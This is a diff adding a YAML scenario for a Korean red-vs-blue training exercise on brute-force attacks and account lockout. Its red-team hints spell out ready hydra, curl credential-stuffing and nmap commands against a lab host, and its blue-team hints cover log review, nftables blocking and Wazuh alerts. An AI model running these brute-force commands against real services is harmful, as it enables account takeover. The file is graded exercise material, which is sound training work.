@@ -1,0 +1,116 @@
+id: "bruteforce-vs-lockout"
+title: "패스워드 공격 vs 계정 보호"
+description: "다크웹에서 유출된 크리덴셜 목록이 발견되었고, 공격자가 이를 이용해 무차별 대입 공격을 시도할 것으로 예상된다. Red Team은 hydra를 사용하여 다양한 서비스의 인증을 돌파해야 한다. Blue Team은 로그인 실패를 실시간 모니터링하고, 자동 차단 메커니즘을 구축하여 계정을 보호해야 한다."
+difficulty: "medium"
+time_limit: 2700
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "hydra를 사용하여 DVWA(http://10.20.30.80:8080) 로그인 페이지에 브루트포스 공격을 수행하라. 사용자명 admin을 대상으로 한다."
+    hint: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.30.80 http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: security=low; PHPSESSID=test' -t 4 -W 1 -f"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "hydra"
+
+  - order: 2
+    instruction: "nmap 스크립트를 사용하여 SSH 서비스(10.20.30.80)에 대한 인증 방식을 확인하라."
+    hint: "nmap --script ssh-auth-methods -p 22 10.20.30.80 --max-retries 1 --host-timeout 15s -T4"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "ssh-auth-methods"
+
+  - order: 3
+    instruction: "hydra로 SSH 서비스(10.20.30.80)에 대해 일반적인 계정/패스워드 조합으로 사전 공격을 수행하라."
+    hint: "hydra -L /usr/share/nmap/nselib/data/usernames.lst -P /usr/share/nmap/nselib/data/passwords.lst 10.20.30.80 ssh -t 4 -W 2 -f -V 2>&1 | head -30"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "hydra"
+
+  - order: 4
+    instruction: "JuiceShop의 로그인 API에 대해 curl을 이용한 credential stuffing을 시뮬레이션하라."
+    hint: "for pass in admin123 password 1234 admin password1; do curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d \"{\\\"email\\\":\\\"admin@juice-sh.op\\\",\\\"password\\\":\\\"$pass\\\"}\" ; echo; done"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "Invalid"
+
+  - order: 5
+    instruction: "whatweb을 사용하여 로그인 페이지의 보안 메커니즘(CSRF 토큰, 캡차 등)을 확인하라."
+    hint: "whatweb http://10.20.30.80:8080/login.php -v"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "http://10.20.30.80"
+
+  - order: 6
+    instruction: "nmap으로 대상 호스트의 SSH, HTTP 서비스 버전 정보를 수집하여 알려진 취약점이 있는지 확인하라."
+    hint: "nmap -sV --script=vulners -p 22,80,3000,8080 10.20.30.80 --max-retries 1 --host-timeout 15s -T4"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "open"
+
+blue_missions:
+  - order: 1
+    instruction: "Apache 접근 로그에서 로그인 시도 실패 패턴을 분석하라."
+    hint: "grep -i 'login\\|brute\\|POST' /var/log/apache2/access.log | tail -30"
+    points: 10
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "POST"
+
+  - order: 2
+    instruction: "SSH 인증 실패 로그에서 브루트포스 공격 흔적을 확인하라."
+    hint: "grep 'Failed password' /var/log/auth.log | tail -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "Failed"
+
+  - order: 3
+    instruction: "nftables로 공격자 IP(10.20.30.201)의 SSH 접근을 차단하라."
+    hint: "nft add rule inet filter input ip saddr 10.20.30.201 tcp dport 22 drop"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 4
+    instruction: "nftables에 SSH 포트에 대한 rate limiting 룰을 추가하라 (분당 5회 제한)."
+    hint: "nft add rule inet filter input tcp dport 22 ct state new limit rate 5/minute accept"
+    points: 20
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 5
+    instruction: "Wazuh에서 브루트포스 관련 알림(룰 ID 5710, 5712 등)을 확인하라."
+    hint: "grep -E '5710|5712|brute' /var/ossec/logs/alerts/alerts.json | tail -20"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "alert"
+
+  - order: 6
+    instruction: "Wazuh에서 SSH 브루트포스 탐지 시 자동 IP 차단을 위한 active-response 설정을 확인하라."
+    hint: "cat /var/ossec/etc/ossec.conf | grep -A 10 'active-response'"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "active-response"
